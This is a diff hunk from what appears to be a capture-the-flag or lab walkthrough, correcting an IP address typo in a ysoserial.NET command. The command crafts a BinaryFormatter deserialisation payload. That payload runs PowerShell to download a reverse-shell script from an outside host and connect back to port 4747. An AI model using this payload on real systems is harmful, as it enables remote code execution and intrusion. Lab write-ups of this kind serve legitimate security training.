@@ -173,5 +173,5 @@ Which does some insecure deserialisation and will let us execute one more revers
 
 ### Use the .NET adaptation of ysoserial to craft payload  
 ```powershell
-./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.43.XX:8000/Invoke-TcpReverseShell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 4747"
+./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.43:8000/Invoke-TcpReverseShell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 4747"
 ```
